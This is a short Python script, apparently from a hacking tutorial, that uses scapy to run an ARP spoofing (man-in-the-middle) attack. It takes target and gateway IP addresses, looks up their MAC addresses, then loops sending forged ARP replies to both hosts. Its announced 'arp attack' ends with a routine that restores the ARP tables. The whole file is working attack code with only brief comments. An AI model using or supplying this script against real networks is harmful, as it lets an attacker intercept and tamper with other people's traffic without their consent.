import scapy.all as scapy
import optparse
import time

po = optparse.OptionParser()


def get_user_input():
    po.add_option("-t", "--target", dest="target_ip", help="enter target ip address")
    po.add_option("-g", "--gateway", dest="modem_ip", help="enter modem ip address")

    return po.parse_args()


def inject_poison(target_ip, poisoned_ip):
    target_mac_address = get_mac_address_by_ip(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)


def cure(target_ip, gateway_ip):
    target_mac_address = get_mac_address_by_ip(target_ip)
    gateway_mac_address = get_mac_address_by_ip(gateway_ip)

    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address, psrc=gateway_ip, hwsrc=gateway_mac_address)
    scapy.send(arp_response, verbose=False, count=6)


def get_mac_address_by_ip(ip):
    arp_request = scapy.ARP(pdst=ip)
    # scp.ls(scp.ARP())
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # scp.ls(scp.Ether))
    merged_packet = broadcast / arp_request
    answered_list = scapy.srp(merged_packet, timeout=1, verbose=False)[0][0][1].hwsrc
    #  if an ip don't answer we won't wait until we get an answer.
    return answered_list


def start():
    try:
        number = 0
        (user_input, arguments) = get_user_input()
        print("arp attack starting...")
        time.sleep(3)

        while True:
            inject_poison(user_input.target_ip, user_input.modem_ip)
            inject_poison(user_input.modem_ip, user_input.target_ip)
            number += 2
            print("\rsending package {0}".format(str(number)), end="")
            time.sleep(3)
    except KeyboardInterrupt:
        print("\nQuit & Reset")
        cure(user_input.target_ip, user_input.modem_ip)


start()

# scapy.ls(scapy.ARP())
# hwdst(hardware destination) means mac address of target.

